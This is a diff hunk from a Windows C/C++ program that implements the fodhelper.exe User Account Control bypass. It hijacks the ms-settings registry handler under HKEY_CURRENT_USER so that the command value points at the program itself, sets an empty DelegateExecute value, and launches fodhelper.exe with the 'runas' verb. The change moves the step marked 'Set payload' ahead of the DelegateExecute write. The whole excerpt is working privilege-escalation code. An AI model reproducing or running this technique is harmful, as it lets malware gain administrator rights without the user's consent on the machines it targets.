@@ -55,15 +55,17 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     CreateRegistryKey(HKEY_CURRENT_USER,
                       L"Software\\Classes\\ms-settings\\Shell\\Open", L"command");
 
+    // Set payload
+    SetRegistryValue(HKEY_CURRENT_USER,
+                     L"Software\\Classes\\ms-settings\\Shell\\Open\\command", L"",
+                     GetCurrentFile());
+    
     // Create DelegateExecute registry value
     SetRegistryValue(HKEY_CURRENT_USER,
                      L"Software\\Classes\\ms-settings\\Shell\\Open", L"DelegateExecute",
                      L"");
     
-    // Set payload
-    SetRegistryValue(HKEY_CURRENT_USER,
-                     L"Software\\Classes\\ms-settings\\Shell\\Open\\command", L"",
-                     GetCurrentFile());
+    
 
     // Start fodhelper.exe with "runas" verb
     ShellExecuteW(NULL, L"runas", L"C:\\Windows\\System32\\fodhelper.exe", NULL,
